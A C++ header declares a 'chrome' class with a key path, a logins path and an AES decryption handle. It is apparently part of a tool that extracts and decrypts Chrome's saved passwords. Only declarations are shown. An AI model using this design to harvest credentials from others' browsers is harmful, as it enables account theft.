#ifndef CHROME_HXX_INCLUDED
#define CHROME_HXX_INCLUDED

#include "browser.hxx"

#include <filesystem>
#include <windows.h>
#include <bcrypt.h>
#include <wil/resource.h>

class chrome : public browser {
public:
    chrome();
    void get(void) override;

private:
    std::filesystem::path m_key_path, m_logins_path;
    wil::unique_bcrypt_algorithm m_aes_alg;

    std::filesystem::path get_base_path(void);
};

#endif // ifndef CHROME_HXX_INCLUDED
